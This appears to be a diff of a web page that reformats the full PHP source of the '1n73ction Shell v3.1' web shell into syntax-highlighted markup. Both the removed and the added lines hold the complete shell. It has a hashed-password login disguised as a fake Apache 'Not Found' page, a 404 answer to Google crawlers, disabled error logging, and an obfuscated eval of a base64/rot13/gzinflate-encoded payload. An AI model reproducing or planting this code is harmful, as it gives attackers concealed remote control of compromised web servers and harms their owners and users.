@@ -37,60 +37,59 @@
 
 <h3>1n73ction Shell v3.1 Source Code</h3>
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
-/* (1n73ction shell v3.1 by x'1n73ct|default pass:" 1n73ction ") */ 
-$auth_pass = "b75d0fe83fb0e1631a47868c279c1c56"; 
-$color = "#00ff00"; 
-$default_action = 'FilesMan'; 
-@define('SELF_PATH', __FILE__); 
-if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
-    header('HTTP/1.0 404 Not Found'); 
-    exit; 
-} 
-@session_start(); 
-@error_reporting(0); 
-@ini_set('error_log',NULL); 
-@ini_set('log_errors',0); 
-@ini_set('max_execution_time',0);
-@ini_set('output_buffering',0); 
-@ini_set('display_errors', 0);
-@set_time_limit(0); 
-@set_magic_quotes_runtime(0); 
-@define('VERSION', '2.1'); 
-if( get_magic_quotes_gpc() ) { 
-    function stripslashes_array($array) { 
-        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
-    } 
-    $_POST = stripslashes_array($_POST); 
-} 
-function printLogin() { 
-    ?&gt; 
-&lt;h1&gt;Not Found&lt;/h1&gt; 
-&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; 
-&lt;hr&gt; 
-&lt;address&gt;Apache Server at &lt;?=$_SERVER['HTTP_HOST']?&gt; Port 80&lt;/address&gt; 
-    &lt;style&gt; 
-        input { margin:0;background-color:#fff;border:1px solid #fff; } 
-    &lt;/style&gt; 
-    &lt;center&gt; 
-    &lt;form method=post&gt; 
-    &lt;input type=password name=pass&gt; 
-    &lt;/form&gt;&lt;/center&gt; 
-    &lt;?php 
-    exit; 
-} 
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
-    if( empty( $auth_pass ) || 
-        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
-    else 
-        printLogin();
-        @ini_set('output_buffering',0); 
-@ini_set('display_errors', 0);
-function x($inject){eval("\$z=gz" . "inf" . "la" . "te(s" . "t" . "r_r" . "ot" . "13(ba" . "se" . "6" . "4" . "_" . "d" . "e" . "c" . "o" . "de(st" . "r" . "_" . "r" . "o" . "t" . "13(" . "gzi" . "nf" . "lat" . "e(" . "bas" . "e6" . "4_d" . "ec" . "ode(\$inject))))));eval(\$z);");}
-x("DczdFkIwAADgB3Kx4+f4uehiJyJFM0bcjYPKqGbFPH19D/Adch2iLn+Qan8XlupmvkrlMEVX3NtyDS2gc9nTGF4X0yHDKSAFnPHHOkwhFNw5v0XIqMdyAylyc5r0ReRkzlhmX8y5Fizfz5rpiQsaz7jdWXZDUbJdcN2KqfRPLWnrJ6t88P9SpB5TNIws6KCxxSXvo3EugK2kQKNA2M66mLG72/0A");
-?&gt;
-</pre>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="cm">/* (1n73ction shell v3.1 by x&#39;1n73ct|default pass:&quot; 1n73ction &quot;) */</span> 
+<span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&quot;b75d0fe83fb0e1631a47868c279c1c56&quot;</span><span class="p">;</span> 
+<span class="nv">$color</span> <span class="o">=</span> <span class="s2">&quot;#00ff00&quot;</span><span class="p">;</span> 
+<span class="nv">$default_action</span> <span class="o">=</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">;</span> 
+<span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;SELF_PATH&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">);</span> 
+<span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span><span class="s1">&#39;Google&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span> 
+    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span> 
+    <span class="k">exit</span><span class="p">;</span> 
+<span class="p">}</span> 
+<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span> 
+<span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">);</span> 
+<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;log_errors&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
+<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;output_buffering&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
+<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+<span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+<span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;VERSION&#39;</span><span class="p">,</span> <span class="s1">&#39;2.1&#39;</span><span class="p">);</span> 
+<span class="k">if</span><span class="p">(</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span> 
+    <span class="k">function</span> <span class="nf">stripslashes_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;stripslashes_array&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span> <span class="o">:</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span> 
+    <span class="p">}</span> 
+    <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">stripslashes_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span> 
+<span class="p">}</span> 
+<span class="k">function</span> <span class="nf">printLogin</span><span class="p">()</span> <span class="p">{</span> 
+    <span class="cp">?&gt;</span><span class="x"> </span>
+<span class="x">&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt; </span>
+<span class="x">&amp;lt;p&amp;gt;The requested URL was not found on this server.&amp;lt;/p&amp;gt; </span>
+<span class="x">&amp;lt;hr&amp;gt; </span>
+<span class="x">&amp;lt;address&amp;gt;Apache Server at </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x"> Port 80&amp;lt;/address&amp;gt; </span>
+<span class="x">    &amp;lt;style&amp;gt; </span>
+<span class="x">        input { margin:0;background-color:#fff;border:1px solid #fff; } </span>
+<span class="x">    &amp;lt;/style&amp;gt; </span>
+<span class="x">    &amp;lt;center&amp;gt; </span>
+<span class="x">    &amp;lt;form method=post&amp;gt; </span>
+<span class="x">    &amp;lt;input type=password name=pass&amp;gt; </span>
+<span class="x">    &amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt; </span>
+<span class="x">    </span><span class="cp">&lt;?php</span> 
+    <span class="k">exit</span><span class="p">;</span> 
+<span class="p">}</span> 
+<span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="p">))</span> 
+    <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="o">||</span> 
+        <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> 
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
+    <span class="k">else</span> 
+        <span class="nx">printLogin</span><span class="p">();</span>
+        <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;output_buffering&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
+<span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">x</span><span class="p">(</span><span class="nv">$inject</span><span class="p">){</span><span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">z=gz&quot;</span> <span class="o">.</span> <span class="s2">&quot;inf&quot;</span> <span class="o">.</span> <span class="s2">&quot;la&quot;</span> <span class="o">.</span> <span class="s2">&quot;te(s&quot;</span> <span class="o">.</span> <span class="s2">&quot;t&quot;</span> <span class="o">.</span> <span class="s2">&quot;r_r&quot;</span> <span class="o">.</span> <span class="s2">&quot;ot&quot;</span> <span class="o">.</span> <span class="s2">&quot;13(ba&quot;</span> <span class="o">.</span> <span class="s2">&quot;se&quot;</span> <span class="o">.</span> <span class="s2">&quot;6&quot;</span> <span class="o">.</span> <span class="s2">&quot;4&quot;</span> <span class="o">.</span> <span class="s2">&quot;_&quot;</span> <span class="o">.</span> <span class="s2">&quot;d&quot;</span> <span class="o">.</span> <span class="s2">&quot;e&quot;</span> <span class="o">.</span> <span class="s2">&quot;c&quot;</span> <span class="o">.</span> <span class="s2">&quot;o&quot;</span> <span class="o">.</span> <span class="s2">&quot;de(st&quot;</span> <span class="o">.</span> <span class="s2">&quot;r&quot;</span> <span class="o">.</span> <span class="s2">&quot;_&quot;</span> <span class="o">.</span> <span class="s2">&quot;r&quot;</span> <span class="o">.</span> <span class="s2">&quot;o&quot;</span> <span class="o">.</span> <span class="s2">&quot;t&quot;</span> <span class="o">.</span> <span class="s2">&quot;13(&quot;</span> <span class="o">.</span> <span class="s2">&quot;gzi&quot;</span> <span class="o">.</span> <span class="s2">&quot;nf&quot;</span> <span class="o">.</span> <span class="s2">&quot;lat&quot;</span> <span class="o">.</span> <span class="s2">&quot;e(&quot;</span> <span class="o">.</span> <span class="s2">&quot;bas&quot;</span> <span class="o">.</span> <span class="s2">&quot;e6&quot;</span> <span class="o">.</span> <span class="s2">&quot;4_d&quot;</span> <span class="o">.</span> <span class="s2">&quot;ec&quot;</span> <span class="o">.</span> <span class="s2">&quot;ode(</span><span class="se">\$</span><span class="s2">inject))))));eval(</span><span class="se">\$</span><span class="s2">z);&quot;</span><span class="p">);}</span>
+<span class="nx">x</span><span class="p">(</span><span class="s2">&quot;DczdFkIwAADgB3Kx4+f4uehiJyJFM0bcjYPKqGbFPH19D/Adch2iLn+Qan8XlupmvkrlMEVX3NtyDS2gc9nTGF4X0yHDKSAFnPHHOkwhFNw5v0XIqMdyAylyc5r0ReRkzlhmX8y5Fizfz5rpiQsaz7jdWXZDUbJdcN2KqfRPLWnrJ6t88P9SpB5TNIws6KCxxSXvo3EugK2kQKNA2M66mLG72/0A&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
